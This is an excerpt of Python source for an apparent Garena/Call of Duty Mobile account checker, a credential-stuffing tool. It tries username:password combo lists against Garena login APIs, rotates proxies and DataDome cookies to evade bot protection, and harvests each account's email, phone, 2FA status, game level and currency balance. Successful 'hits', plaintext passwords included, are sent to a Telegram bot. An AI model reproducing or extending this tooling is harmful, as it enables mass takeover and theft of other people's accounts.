                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=5)

            if response.status_code == 403:
                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/2")
                if datadome_manager.handle_403(session, telegram_config=telegram_config):
                    logger.info(f"[INIT] Proxy rotated — retrying account/init...")
                    time.sleep(0.01 + init_attempt * 0.01)
                    session.proxies.update(geo_rotator.get_proxies())
                    continue
                else:
                    live_stats.update_stats(valid=False)
                    return f"🚫 Banned (Cookie flagged)"

            try:
                account_data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid JSON response from account init")
                live_stats.update_stats(valid=False)
                return ""
            break  # success

        if account_data is None:
            logger.error(f"[INIT] ❌ Failed account/init after all retries — skipping")
            live_stats.update_stats(valid=False)
            return f"🚨 IP Blocked - account/init failed after retries"

        if 'error' in account_data:
            if account_data.get('error') == 'ACCOUNT DOESNT EXIST':
                live_stats.update_stats(valid=False)
                return ""
            live_stats.update_stats(valid=False)
            logger.error(f"      ✘ Error fetching details: {account_data['error']}")
            return ""
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        login_history = account_data.get('login_history') or []
        last_login_ip = None
        last_login_where = None
        last_login_ts = None

        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ip = entry.get('ip') or entry.get('login_ip') or entry.get('ip_address')
                last_login_where = entry.get('country') or entry.get('location') or entry.get('region')
                last_login_ts = entry.get('timestamp')
        
        # Skip disk scan — already extracted what we can from the API response
        if not last_login_ip or not last_login_where:
            pass  # N/A is acceptable; disk scan removed (was O(n) per account — major slowdown)
        
        def fmt_ts(ts):
            try:
                ts_int = int(ts)
                return datetime.fromtimestamp(ts_int, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except Exception:
                return 'Unknown'

        last_login_str = fmt_ts(last_login_ts) if last_login_ts else 'Unknown'
        details['last_login'] = last_login_str
        details['last_login_where'] = last_login_where or 'N/A'
        ip_for_msg = last_login_ip or account_data.get('init_ip') or 'N/A'
        details['ip_for_msg'] = ip_for_msg
        if account_data.get('country'):
            details['country'] = account_data.get('country')
        
        has_codm, codm_info = check_codm_account(session, account)
        
        def is_codm_invalid(info):
            if not info:
                return True
            if isinstance(info, str):
                return "error" in info.lower()
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()):
                    return True
                if str(info.get('codm_nickname', '')).strip().upper() in invalid_values:
                    return True
            return False

        if not has_codm or is_codm_invalid(codm_info):
            live_stats.update_stats(valid=True, clean=details.get('is_clean', False), has_codm=False)
            save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)
            save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)

            # ── Shell balance early-send ───────────────────────────────
            # Even without CODM, if the account has Garena Shell balance
            # send a Telegram hit immediately (bypass level filter entirely)
            if telegram_config:
                _shell = details.get('profile', {}).get('shell_balance', 0)
                try:
                    _shell_int = int(str(_shell).strip()) if str(_shell).strip().isdigit() else 0
                except Exception:
                    _shell_int = 0
                if _shell_int > 0:
                    tg_token  = telegram_config[0]
                    tg_chat   = telegram_config[1]
                    tg_clean_filter = telegram_config[4] if len(telegram_config) > 4 else 'both'
                    _is_clean = details.get('is_clean', False)
                    _clean_pass = (tg_clean_filter == 'both' or
                                   (tg_clean_filter == 'clean' and _is_clean) or
                                   (tg_clean_filter == 'notclean' and not _is_clean))
                    if tg_token and tg_chat and _clean_pass:
                        _email   = details.get('email', 'N/A')
                        _uname   = details.get('username', account)
                        _country = details.get('personal', {}).get('country', 'N/A')
                        _mobile  = details.get('personal', {}).get('mobile_no', 'N/A')
                        _2fa     = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
                        _auth    = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
                        _clean_tag = '✅ CLEAN' if _is_clean else '❌ NOT CLEAN'
                        _ev_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
                        _ev      = "Verified" if _ev_flag else "Not Verified"
                        shell_msg = (
                            f'💰 <b>SHELL BALANCE HIT!</b>\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'👤 <b>Username:</b> <code>{_uname}</code>\n'
                            f'🔑 <b>Password:</b> <code>{password}</code>\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'💰 <b>Garena Shell:</b> <b>{_shell_int:,}</b> Shells\n'
                            f'🎮 <b>CODM:</b> Not linked\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'🔒 <b>Security</b>\n'
                            f'   📧 Email: <code>{_email}</code> ({_ev})\n'
                            f'   📱 Mobile Bound: {"Yes" if _mobile and str(_mobile).strip() else "No"}\n'
                            f'   🔐 2FA: {_2fa}\n'
                            f'   🛡️ Auth App: {_auth}\n'
                            f'   🌍 Country: {_country}\n'
                            f'   📊 Status: {_clean_tag}\n'
                            f'━━━━━━━━━━━━━━━━━━━━\n'
                            f'⚡ by @Yukiii_ii'
                        )
                        _send_telegram_async(tg_token, tg_chat, shell_msg)
            return ""
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        
        save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
        save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)

        _codm_lvl = codm_info.get('codm_level', 0) if has_codm and codm_info else 0
        _codm_rgn = codm_info.get('region', '') if has_codm and codm_info else ''
        _acc_country = details.get('personal', {}).get('country', '') if details else ''
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=_codm_lvl, region=_codm_rgn, country=_acc_country)
        
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
        email_ver = "Verified" if email_verified_flag else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_display = mobile if mobile and str(mobile).strip() else "None"
        mobile_bound = f"{Colors.GREEN}Yes{Colors.RESET}" if mobile and str(mobile).strip() else f"{Colors.RED}No{Colors.RESET}"
        email_verified_display = f"{Colors.GREEN}Yes{Colors.RESET}" if email_verified_flag else f"{Colors.RED}No{Colors.RESET}"

        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')

        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        clean_status = f"{Colors.GREEN}CLEAN{Colors.RESET}" if details.get('is_clean') else f"{Colors.RED}NOT CLEAN{Colors.RESET}"

        codm_nickname = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if has_codm else 'N/A'

        mess = f"""
{Colors.LIGHTGREEN_EX}[+] Garena Info{Colors.RESET}
      {Colors.CYAN}Username     :{Colors.RESET} {Colors.WHITE}{username}{Colors.RESET}
      {Colors.CYAN}Password     :{Colors.RESET} {Colors.WHITE}{password}{Colors.RESET}
      {Colors.CYAN}Garena Shell :{Colors.RESET} {Colors.YELLOW}{shell}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] CODM Info{Colors.RESET}
      {Colors.CYAN}Nickname :{Colors.RESET} {Colors.WHITE}{codm_nickname}{Colors.RESET}
      {Colors.CYAN}UID      :{Colors.RESET} {Colors.WHITE}{codm_uid}{Colors.RESET}
      {Colors.CYAN}Level    :{Colors.RESET} {Colors.WHITE}{codm_level}{Colors.RESET}
      {Colors.CYAN}Region   :{Colors.RESET} {Colors.WHITE}{codm_region}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] Security{Colors.RESET}
      {Colors.CYAN}Mobile No      :{Colors.RESET} {Colors.WHITE}{mobile_display}{Colors.RESET}
      {Colors.CYAN}Email          :{Colors.RESET} {Colors.WHITE}{email} ({email_ver}){Colors.RESET}
      {Colors.CYAN}Mobile Bound   :{Colors.RESET} {mobile_bound}
      {Colors.CYAN}Email Verified :{Colors.RESET} {email_verified_display}
      {Colors.CYAN}Authenticator  :{Colors.RESET} {authenticator_enabled}
      {Colors.CYAN}2FA Enabled    :{Colors.RESET} {two_step_enabled}
      {Colors.CYAN}Country        :{Colors.RESET} {Colors.WHITE}{acc_country}{Colors.RESET}
      {Colors.CYAN}Account Status :{Colors.RESET} {clean_status}

  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
  {Colors.WHITE}CONFIG BY: @Yukiii_ii{Colors.RESET}
""".strip()

        print(mess) if not BOT_MODE else None

        # ── Telegram Notification ──────────────────────────────────────────────
        if telegram_config:
            tg_token, tg_chat, tg_thresholds, tg_mention = telegram_config[0], telegram_config[1], telegram_config[2], telegram_config[3]
            tg_clean_filter = telegram_config[4] if len(telegram_config) > 4 else 'both'
            try:
                lvl = int(str(codm_level).strip()) if str(codm_level).strip().isdigit() else 0
            except Exception:
                lvl = 0

            # ── Shell balance check ────────────────────────────────
            # Convert shell to int safely (could be 'N/A', int, or string)
            try:
                shell_int = int(str(shell).strip()) if str(shell).strip().isdigit() else 0
            except Exception:
                shell_int = 0
            has_shell_balance = shell_int > 0

            thr_list = tg_thresholds if isinstance(tg_thresholds, list) else [tg_thresholds]
            is_clean = details.get('is_clean', False)
            clean_pass = (tg_clean_filter == 'both' or
                          (tg_clean_filter == 'clean' and is_clean) or
                          (tg_clean_filter == 'notclean' and not is_clean))

            # ── Send if: level passes threshold  OR  has shell balance ──
            # Shell balance accounts bypass the level filter entirely
            level_pass = any(lvl >= t for t in thr_list)
            should_send = tg_token and tg_chat and clean_pass and (level_pass or has_shell_balance)

            if should_send:
                clean_tag   = '✅ CLEAN' if is_clean else '❌ NOT CLEAN'
                # Shell tag — highlight prominently if balance > 0
                shell_tag   = f'💰 <b>{shell_int:,}</b> Shells' if has_shell_balance else f'0 Shells'
                # Hit reason tag — show why this was sent
                if has_shell_balance and not level_pass:
                    hit_reason = f'💰 Shell Balance Hit (Level {lvl} — bypassed threshold)'
                elif has_shell_balance and level_pass:
                    hit_reason = f'🎯 Level + Shell Hit'
                else:
                    hit_reason = f'🎯 Level Hit'

                tg_msg = (
                    f'🎯 <b>NEW HIT FOUND!</b>  [{hit_reason}]\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'👤 <b>Username:</b> <code>{username}</code>\n'
                    f'🔑 <b>Password:</b> <code>{password}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'💰 <b>Garena Shell:</b> {shell_tag}\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'🎮 <b>CODM Info</b>\n'
                    f'   📛 Nickname: <code>{codm_nickname}</code>\n'
                    f'   🆔 UID: <code>{codm_uid}</code>\n'
                    f'   ⭐ Level: <code>{codm_level}</code>\n'
                    f'   🌏 Region: <code>{codm_region}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'🔒 <b>Security</b>\n'
                    f'   📧 Email: <code>{email}</code> ({email_ver})\n'
                    f'   📱 Mobile Bound: {"Yes" if mobile and str(mobile).strip() else "No"}\n'
                    f'   🔐 2FA: {two_step_enabled}\n'
                    f'   🛡️ Auth App: {authenticator_enabled}\n'
                    f'   🌍 Country: {acc_country}\n'
                    f'   📊 Status: {clean_tag}\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'⚡ by @Yukiii_ii'
                )
                _send_telegram_async(tg_token, tg_chat, tg_msg)

        return ""

    except Exception as e:
        logger.error(f"      💥 Unexpected error processing: {e}")
        live_stats.update_stats(valid=False)
        return ""

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            bot_console.print(f"[cyan] NO DUPLICATES LINES FOUND {os.path.basename(file_path)}.[/cyan]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        bot_console.print(f"[green][+] Successfully removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except FileNotFoundError:
        bot_console.print(f"[red][ERROR] File not found: {file_path}[/red]")
        return False
    except Exception as e:
        bot_console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
        return False


# ══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ══════════════════════════════════════════════════════════════
TELEGRAM_CONFIG_FILE = "telegram_config.json"

def load_telegram_config() -> dict | None:
    """Load saved Telegram hits config from disk."""
    if os.path.exists(TELEGRAM_CONFIG_FILE):
        try:
            with open(TELEGRAM_CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return None

def save_telegram_config(config: dict):
    """Save Telegram hits config to disk."""
    with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

_tg_hit_session = requests.Session()
_tg_hit_session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=2, pool_maxsize=4))

def send_telegram_message(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
    """Send a Telegram message. Returns message_id on success, None on failure."""
    try:
        url  = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": parse_mode}
        resp = _tg_hit_session.post(url, data=data, timeout=5)
        if resp.status_code == 200:
            return resp.json().get("result", {}).get("message_id")
    except Exception:
        pass
    return None

def _send_telegram_async(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
    """Fire-and-forget Telegram message — doesn't block the checker thread."""
    threading.Thread(
        target=send_telegram_message,
        args=(bot_token, chat_id, message, parse_mode),
        daemon=True,
    ).start()

def delete_telegram_message(bot_token: str, chat_id, message_id, delay: int = 5):
    """Delete a Telegram message after a delay (seconds)."""
    if not message_id:
        return
    try:
        time.sleep(delay)
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/deleteMessage",
            data={"chat_id": chat_id, "message_id": message_id},
            timeout=10
        )
    except Exception:
        pass

def send_and_delete(bot_token: str, chat_id, message: str, delay: int = 20, parse_mode: str = "HTML"):
    """Send a message then auto-delete it after delay seconds (background thread)."""
    def _do():
        msg_id = send_telegram_message(bot_token, chat_id, message, parse_mode)
        if msg_id:
            delete_telegram_message(bot_token, chat_id, msg_id, delay=delay)
    threading.Thread(target=_do, daemon=True).start()


def setup_telegram():
    """
    Setup Telegram hits notifications.
    Bot token is taken from the hardcoded BOT_TOKEN constant — no prompt needed.
    Only asks for: Chat ID, level threshold, mention username, clean filter.
    Returns (bot_token, chat_id, level_threshold, mention_username, clean_filter)
    """
    from rich.prompt import Confirm, Prompt
    from rich import box as rbox
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.align import Align

    # Always use the hardcoded token
    bot_token = BOT_TOKEN

    bot_console.print()
    bot_console.print(Panel(Align.center(Text('📱 Telegram Hits Config', style='bold cyan')),
                        border_style='cyan', box=rbox.ROUNDED, width=80))

    # ── Load existing config ───────────────────────────────────
    existing = load_telegram_config()
    _CF_MAP = {'clean': '✅ CLEAN only', 'notclean': '❌ NOT CLEAN only', 'both': '🔄 BOTH'}

    if existing:
        bot_console.print(Panel(
            f"[green]✅ Found existing configuration[/green]\n"
            f"[yellow]Chat ID:[/yellow]         [white]{existing.get('chat_id', 'N/A')}[/white]\n"
            f"[yellow]Level Threshold:[/yellow] [white]{', '.join(f'{t}+' for t in (existing.get('level_threshold', [100]) if isinstance(existing.get('level_threshold', [100]), list) else [existing.get('level_threshold', 100)]))}[/white]\n"
            f"[yellow]Notify for:[/yellow]      [white]{_CF_MAP.get(existing.get('clean_filter', 'both'), '🔄 BOTH')}[/white]\n"
            f"[yellow]Mention:[/yellow]         [white]{existing.get('mention_username', 'None')}[/white]",
            title='[bold green]Current Config[/bold green]', border_style='green', width=80
        ))
        if Confirm.ask('[bold cyan]Use existing configuration?[/bold cyan]'):
            raw = existing.get('level_threshold', [100])
            thr = raw if isinstance(raw, list) else [raw]
            return (bot_token, existing['chat_id'],
                    thr, existing.get('mention_username', ''),
                    existing.get('clean_filter', 'both'))

    # ── Chat ID ────────────────────────────────────────────────
    bot_console.print(Panel(
        '[dim]Enter the Chat/Channel ID where hits will be sent.\n'
        'Get it via @userinfobot or use the format -100xxxxxxxxxx[/dim]',
        title='[bold blue]Setup Instructions[/bold blue]', border_style='blue', width=80
    ))
    chat_id = Prompt.ask('[bold cyan]💬 Chat/Channel ID[/bold cyan]').strip()

    # ── Level threshold ────────────────────────────────────────
    bot_console.print(Panel(
        '[bold yellow]Select level(s) to get notified for:[/bold yellow]\n'
        '[dim]You can pick multiple — type numbers separated by comma (e.g. 3,4)[/dim]',
        border_style='yellow', width=80))
    tbl = Table(show_header=False, box=rbox.SIMPLE, width=36)
    tbl.add_column('', style='bold white', width=4)
    tbl.add_column('', style='dim white')
    level_map    = {'1': 100, '2': 200, '3': 300, '4': 400, '5': 1}
    level_labels = {'1': 'Level 100+', '2': 'Level 200+', '3': 'Level 300+',
                    '4': 'Level 400+', '5': 'ALL levels'}
    for k, v in level_labels.items():
        tbl.add_row(f'[{k}]', v)
    bot_console.print(tbl)

    while True:
        lc_raw     = Prompt.ask('[bold cyan]Choose level(s)[/bold cyan]', default='1').strip()
        lc_choices = [x.strip() for x in lc_raw.split(',') if x.strip() in level_map]
        if lc_choices:
            break
        bot_console.print('[red]Invalid choice — use numbers 1-5[/red]')

    thresholds     = [1] if '5' in lc_choices else sorted(set(level_map[k] for k in lc_choices))
    thresh_display = 'ALL' if thresholds == [1] else ', '.join(f'{t}+' for t in thresholds)

    # ── Mention username ───────────────────────────────────────
    mention = Prompt.ask(
        '[bold cyan]📣 Telegram username to mention on hits (leave blank to skip)[/bold cyan]',
        default=''
    ).strip()

    # ── Clean filter ───────────────────────────────────────────
    bot_console.print(Panel(
        '[bold yellow]Which accounts trigger a notification?[/bold yellow]',
        border_style='yellow', width=80))
    ctbl = Table(show_header=False, box=rbox.SIMPLE, width=30)
    ctbl.add_column('', style='bold white', width=4)
    ctbl.add_column('', style='dim white')
    ctbl.add_row('[1]', '✅ CLEAN only')
    ctbl.add_row('[2]', '❌ NOT CLEAN only')
    ctbl.add_row('[3]', '🔄 BOTH (all hits)')
    bot_console.print(ctbl)
    clean_choice        = Prompt.ask('[bold cyan]Choose[/bold cyan]', choices=['1', '2', '3'], default='3')
    clean_filter        = {'1': 'clean', '2': 'notclean', '3': 'both'}[clean_choice]
    clean_filter_display = {'clean': '✅ CLEAN only', 'notclean': '❌ NOT CLEAN only', 'both': '🔄 BOTH'}[clean_filter]

    # ── Test message ───────────────────────────────────────────
    test_msg = (
        f'<b>🎯 Test Message</b>\n\n'
        f'<b>✅ Bot is working!</b>\n'
        f'<b>🎮 Level threshold:</b> <code>{thresh_display}</code>\n'
        f'<b>📊 Notify for:</b> <code>{clean_filter_display}</code>\n'
        f'<b>⚡ Ready to receive hits!</b>'
    )
    bot_console.print(Panel('[yellow]🧪 Sending test message...[/yellow]', border_style='yellow', width=80))

    if send_telegram_message(bot_token, chat_id, test_msg):
        bot_console.print(Panel('[bold green]✅ Test message sent! Check your Telegram.[/bold green]',
                            border_style='green', width=80))
        config = {
            'bot_token':        bot_token,
            'chat_id':          chat_id,
            'level_threshold':  thresholds,
            'mention_username': mention,
            'clean_filter':     clean_filter,
            'enabled':          True
        }
        if Confirm.ask('[bold green]💾 Save configuration?[/bold green]'):
            save_telegram_config(config)
            bot_console.print(Panel('[bold green]📁 Saved![/bold green]', border_style='green', width=80))
        return (bot_token, chat_id, thresholds, mention, clean_filter)
    else:
        bot_console.print(Panel('[bold red]❌ Failed — check your Chat ID and make sure the bot is added to the chat.[/bold red]',
                            border_style='red', width=80))
        return (None, None, None, None, None)


# ========== DISPLAY BANNER ==========
def print_banner():
    lines = [
        f'{W}',
        f'{W}{B}[{R}★{W}] {CY}{Style.BRIGHT}TYRAAA CUUTIEEEE{Style.RESET_ALL} {B}[{R}★{W}]',
        f'{W}{GR}                          :::!~!!!!!:.',
        f'{W}{GR}                     .xUHWH!! !!?M88WHX:.',
        f'{W}{GR}                  .X*#M@$!  !X!M$$$$$WWx:',
        f'{W}{GR}                  :!!!!!!?H! :!$!$$$$$$$$8X:',
        f'{W}{GR}                :!~::!H![   ~.U$X!?W$$$$MM!',
        f'{W}{GR}                  ~!~!!!!~~ .:XW$$$U!!?$WMM!',
        f'{W}{GR}               !:~~~ .:!M*T#$$$WX??#MRRMMM!',
        f'{W}{GR}               ~?WuxiW*     *#$$$8!!!!??!!!',
        f"{W}{GR}             :X- M$$$$  {R}  *{GR}  '#T#$~!8$WUXU~",
        f"{W}{GR}          :%'  ~%$Mm:         ~!~ ?$$$$$",
        f'{W}{GR}          :! .-   ~T$8xx.  .xWW- ~""##*\'\'',
        f"{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$ {R} * {GR} /'",
        f"{W}{GR} W$@@M!!! .!~~ !!     .:XUW$W!~ '*~:   :",
        f"{W}{GR} %^~~'.:x%'!!  !H:   !WM$$$$Ti.: .!WUnn!",
        f'{W}{GR} :::~:!. :X~ .: ?H.!u $$$$$$!W:U!T$M~',
        f"{W}{GR} .~~   :X@!.-~   ?@WTWo('*$W$TH$!",
        f'{W}{GR} Wi.~!X$?!-~    : ?$$$B$Wu(***$RM!',
        f'{W}{GR} $R@i.#~ !     :   -$$$$$%$Mm$;',
        f'{W}{GR} ?MXT@Wx.~    :     ~##$$$M~',
        f'{W} ',
        f'\033[1m{R}{W}{RED}{B} {W}{RED} Garena Bind Checker: by Tyraa Cutieee {B} {W}{R}\033[0m'
    ]

    for line in lines:
        print(line)
        pass  # removed sleep — no visible difference
    print()

def create_thread_session(cookie_manager, datadome_manager):
    """Create a fast cloudscraper session with keep-alive and lean connection pools.
    Each thread only talks to ~3 hosts (sso.garena, account.garena, codm.garena)
    so large pools waste RAM. Keep pools tiny → more threads can run at once.
    
    Proxy strategy:
    1. If proxies available → use them (DataDome bypass via clean IP)
    2. If no proxies → try direct connection (works on non-flagged IPs)
    3. Always attempt to get a fresh DataDome cookie for the session"""
    sess = cloudscraper.create_scraper()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=3,
        pool_maxsize=5,
        max_retries=1,
    )
    sess.mount("http://",  adapter)
    sess.mount("https://", adapter)
    # ── Keep-alive: reuse the same TCP connection for all requests in a thread ──
    sess.headers.update({
        "Connection":       "keep-alive",
        "Accept-Encoding":  "gzip, deflate, br",
        "Accept":           "application/json, text/plain, */*",
    })
    
    # ── Set proxy — if available ──
    proxy_dict = geo_rotator.get_proxies()
    if proxy_dict:
        sess.proxies.update(proxy_dict)
        logger.info(f"[SESSION] Thread {threading.get_ident()} using proxy: {proxy_dict.get('https', 'N/A')}")
    else:
        logger.warning(f"[SESSION] Thread {threading.get_ident()} ⚠️ No proxy available — using direct connection")
    
    # ── DataDome cookie setup ──
    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
        combined_cookie_str = "; ".join(valid_cookies)
        applyck(sess, combined_cookie_str)
        final_cookie_value = valid_cookies[-1]
        datadome_value = (
            final_cookie_value.split('=', 1)[1].strip()
            if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1
            else None
        )
        if datadome_value:
            datadome_manager.set_datadome(datadome_value)
        else:
            # Cookie in file didn't have a valid datadome — fetch fresh one
            datadome = get_datadome_cookie(sess)
            if datadome:
                datadome_manager.set_datadome(datadome)
    else:
        datadome = get_datadome_cookie(sess)
        if datadome:
            datadome_manager.set_datadome(datadome)
    # ── Safety net: if we STILL have no datadome, try one more time with forced rotation ──
    if not datadome_manager.get_datadome():
        try:
            geo_rotator.force_rotate()
            sess.proxies.update(geo_rotator.get_proxies())
            datadome = get_datadome_cookie(sess, max_retries=2)
            if datadome:
                datadome_manager.set_datadome(datadome)
                logger.info(f"[DATADOME] ✅ Got cookie on forced rotation retry")
            else:
                logger.warning(f"[DATADOME] ⚠️ Still no cookie after forced rotation — thread will retry during processaccount")
        except Exception as e:
            logger.warning(f"[DATADOME] ⚠️ Forced rotation failed: {e}")
    return sess


def _cleanup_stale_files():
    """
    Delete leftover combo/ and *_results/ folders from previous crashes.
    Called once at bot startup to recover disk space.
    NOTE: Does NOT touch saved_combos/ or saved_proxies/ — those are persistent across restarts.
    """
    import shutil, glob
    base = os.path.dirname(os.path.abspath(__file__))

    # combo/ folder — temp uploaded files (safe to delete, saved_combos/ has persistent copies)
    combo_dir = os.path.join(base, "combo")
    if os.path.isdir(combo_dir):
        for f in os.listdir(combo_dir):
            fp = os.path.join(combo_dir, f)
            try:
                if os.path.isfile(fp):
                    os.remove(fp)
                    logger.warning(f"[CLEANUP] Removed stale combo file: {f}")
            except Exception:
                pass

    # *_results/ folders — unzipped result dirs (base dir and inside combo/)
    for pattern in [os.path.join(base, "*_results"), os.path.join(combo_dir, "*_results")]:
        for d in glob.glob(pattern):
            try:
                shutil.rmtree(d, ignore_errors=True)
                logger.warning(f"[CLEANUP] Removed stale results folder: {os.path.basename(d)}")
            except Exception:
                pass

    # saved_combos/ is NEVER cleaned — these persist across restarts for auto-resume
    # saved_proxies/ is NEVER cleaned — these persist across restarts for proxy auto-restore
    # Individual combo files are removed by _remove_active_session() when checks complete


# ══════════════════════════════════════════════════════════════
#  BOT CONFIG  — loaded from config.json, or asked on first run
# ══════════════════════════════════════════════════════════════
CONFIG_FILE = "config.json"

# ── Railway / cloud deployment support ──────────────────────────────
# Environment variables take priority over config.json — this ensures
# the bot can start on Railway (ephemeral FS) without the setup wizard.
def _is_railway() -> bool:
    """Detect if running on Railway (or similar cloud platform)."""
    return bool(os.environ.get("RAILWAY_SERVICE_ID") or os.environ.get("RAILWAY_PROJECT_ID") or os.environ.get("RAILWAY_ENVIRONMENT"))

def _env_config() -> dict:
    """Build a config dict from environment variables (if set)."""
    cfg = {}
    if os.environ.get("BOT_TOKEN"):
        cfg["bot_token"] = os.environ["BOT_TOKEN"].strip()
    if os.environ.get("OWNER_ID"):
        try:
            cfg["owner_id"] = int(os.environ["OWNER_ID"].strip())
        except ValueError:
            pass
    if os.environ.get("OWNER_USERNAME"):
        cfg["owner_username"] = os.environ["OWNER_USERNAME"].strip().lstrip("@")
    if os.environ.get("COOWNER_IDS"):
        try:
            cfg["coowner_ids"] = [int(x.strip()) for x in os.environ["COOWNER_IDS"].split(",") if x.strip().lstrip("-").isdigit()]
        except ValueError:
            pass
    if os.environ.get("KEYSYSTEM_URL"):
        cfg["keysystem_url"] = os.environ["KEYSYSTEM_URL"].strip()
    if os.environ.get("KEYSYSTEM_ADMIN_SECRET"):
        cfg["keysystem_admin_secret"] = os.environ["KEYSYSTEM_ADMIN_SECRET"].strip()
    return cfg

def _load_config() -> dict:
    """Load config: config.json first, then env vars as fallback, then KeyVault state."""
    # Guard against circular calls (KeySystemAPI.__init__ calls _load_config)
    if getattr(_load_config, "_in_progress", False):
        return {}
    _load_config._in_progress = True
    try:
        cfg = {}
        # 1. Try config.json on disk
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                    cfg = json.load(f)
            except Exception:
                pass
        # 2. Overlay with environment variables (they take priority)
        env_cfg = _env_config()
        if env_cfg:
            cfg.update(env_cfg)
        # 3. If still missing critical fields, try KeyVault API (survives redeploy)
        if not cfg.get("bot_token") or not cfg.get("owner_id"):
            try:
                api = _get_keysystem_api()
                if api and api.enabled:
                    remote_cfg = api.load_state("bot_config")
                    if isinstance(remote_cfg, dict):
                        for k, v in remote_cfg.items():
                            if k not in cfg or not cfg[k]:
                                cfg[k] = v
                        logger.info("[CONFIG] Loaded fallback config from KeyVault API")
            except Exception as e:
                logger.debug(f"[CONFIG] KeyVault config fallback failed: {e}")
        return cfg
    finally:
        _load_config._in_progress = False

def _save_config(cfg: dict):
    """Persist config to config.json AND sync to KeyVault API for Railway persistence."""
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    print(f"\033[92m✅ Config saved to {CONFIG_FILE}\033[0m")
    # Also sync to KeyVault API so config survives Railway redeploy
    try:
        api = _get_keysystem_api()
        if api and api.enabled:
            api.save_state("bot_config", cfg)
            logger.info("[CONFIG] Synced config to KeyVault API")
    except Exception as e:
        logger.debug(f"[CONFIG] KeyVault config sync failed: {e}")

def _validate_token(token: str) -> bool:
    """Quick check — call getMe and verify ok:true."""
    try:
        r = requests.get(
            f"https://api.telegram.org/bot{token}/getMe",
            timeout=10,
        )
        data = r.json()
        return data.get("ok", False)
    except Exception:
